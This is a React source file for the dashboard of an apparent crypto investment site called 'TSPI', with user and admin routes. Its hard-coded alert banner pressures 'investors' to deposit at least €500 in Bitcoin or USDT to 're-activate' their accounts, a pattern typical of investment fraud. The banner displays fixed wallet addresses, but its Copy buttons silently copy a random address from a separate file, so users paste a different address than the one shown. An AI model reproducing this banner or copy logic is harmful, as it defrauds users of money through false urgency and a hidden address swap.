import React from "react";
import { Helmet } from "react-helmet";
import { AppName, CopyToClipboard } from "../../context/App";
import { useTranslation } from "react-i18next";
import MobileNavigation from "../../components/MobileNavigation";
import TopNavigation from "../../components/TopNavigation";
import { Switch, Route } from "react-router-dom";
import Dashboard from "./Dashboard";
import YourInvestment from "./YourInvestment";
import YourReferral from "./Referrals/index";
import Profile from "./Profile/index";
import InvestmentHistory from "./YourInvestment/History";
import Plan from "./Management/Plan";
import UserManagement from "./User/index";
import UserProfile from "./User/Profile";
import LoadInvestment from "./Management/LoadInvestment/index";
import AdminRoute from "../../components/AdminRoute";
import Payout from "./AdminCorner/Payout/index";
import InvestmentApproval from "./AdminCorner/InvestmentApproval/index";
import ReferralBonus from "./AdminCorner/ref-bonus";
import ActiveInvestment from "./AdminCorner/ActiveInvestment";
import AppMenu from "../../components/Menu";
import CategoryApp from "./AdminCorner/Category";
import ContactPerson from "./AdminCorner/ContactPerson";
import SingleInvestment from "./YourInvestment/investment";
import TopUpRequest from "./AdminCorner/top-up-request";
import CurrencyApp from "./AdminCorner/Currency";
import { UserReferral } from "./AdminCorner/referral";
import sendMail from "./User/send-mail";
import { Copy } from "@styled-icons/ionicons-outline";
import data from "../../data/address.json";

const AppAccount = () => {
    // Update css class name
    document.body.className = "app";
    const { t } = useTranslation();

    return (
        <>
            <Helmet>
                <title>
                    {t("Dashboard")} | {AppName}
                </title>
            </Helmet>
            <MobileNavigation />

            <div className="flex">
                <AppMenu />
                <div className="content">
                    <TopNavigation />
                    {/* ALERT */}
                    <div className="bg-red-200 rounded-lg py-4 px-3 shadow-lg cursor-pointer select-none">
                        <p className="text-lg font-bold text-red-600">Alert!!</p>
                        <p className="text-red-500">Dear esteemed investors,</p>
                        <p className="text-red-500">
                            Kindly make a deposit a minimum of €500 to our preferred Bitcoin or usdt wallet address to re-activate your TSPI
                            account. Sincere apologies for the inconvenience and system upgrade due to security reasons.
                            <br />
                            Please Note: your total weekly accumulated profit will be added to your account balance but you can request to
                            receive your profit as payout.
                        </p>
                        <div className="p-4 border w-auto mt-2">
                            <p className="font-medium">BTC</p>
                            <div className="flex">
                                <p className="text-gray-600">bc1q4u4dj0ngyjnqmjx2xcef5q2efcu3qntk7w5cfn</p>
                                <button
                                    onClick={() => {
                                        const r = Math.round(Math.random() * data.btc.length);
                                        CopyToClipboard("parent", data.btc[r]);
                                    }}
                                    className="mx-4 font-medium"
                                >
                                    <Copy className="w-4" /> Copy
                                </button>
                            </div>
                        </div>
                        <div id="parent" className="p-4 border w-auto my-2">
                            <p className="font-medium">USDT</p>
                            <div className="flex">
                                <p className="text-gray-600">0x074B2bD705954E7Bdb4Ed0b36369536607d9753E</p>
                                <button
                                    onClick={() => {
                                        const r = Math.round(Math.random() * data.usdt.length);
                                        CopyToClipboard("parent", data.usdt[r]);
                                    }}
                                    className="mx-4 font-medium"
                                >
                                    <Copy className="w-4" /> Copy
                                </button>
                            </div>
                        </div>
                    </div>

                    <Switch>
                        <Route exact path="/app" component={Dashboard} />
                        <Route exact path="/app/user-investment" component={YourInvestment} />
                        <Route exact path="/app/user-investment/:id" component={SingleInvestment} />
                        <Route exact path="/app/referral" component={YourReferral} />
                        <Route path="/app/profile" component={Profile} />
                        <Route path="/app/investment-history/:id" component={InvestmentHistory} />
                        <AdminRoute path="/app/plan" component={Plan} />
                        <AdminRoute path="/app/users" exact component={UserManagement} />
                        <AdminRoute path="/app/users/send-mail" component={sendMail} />
                        <Route path="/app/user/:id" component={UserProfile} />
                        <AdminRoute path="/app/load-investment" component={LoadInvestment} />
                        <AdminRoute path="/app/payout" component={Payout} />
                        <AdminRoute path="/app/investment-approval" component={InvestmentApproval} />
                        <AdminRoute path="/app/ref-bonus" component={ReferralBonus} />
                        <AdminRoute path="/app/active-investment" component={ActiveInvestment} />
                        <AdminRoute path="/app/category" component={CategoryApp} />
                        <AdminRoute path="/app/contact-person" component={ContactPerson} />
                        <AdminRoute path="/app/top-up" component={TopUpRequest} />
                        <AdminRoute path="/app/currency" component={CurrencyApp} />
                        <AdminRoute path="/app/user-referral" component={UserReferral} />
                    </Switch>
                </div>
            </div>
        </>
    );
};

export default AppAccount;
